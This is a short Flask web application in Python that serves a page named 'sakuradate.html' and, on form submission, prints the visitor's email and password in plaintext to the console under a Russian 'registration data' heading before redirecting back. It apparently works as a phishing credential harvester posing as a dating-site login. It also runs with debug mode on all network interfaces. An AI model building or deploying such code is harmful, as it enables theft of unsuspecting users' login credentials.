from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        print(f"\n=== Данные регистрации ===")
        print(f"Email: {email}")
        print(f"Password: {password}")
        print("=========================")
        return redirect(url_for('login'))
    return render_template('sakuradate.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
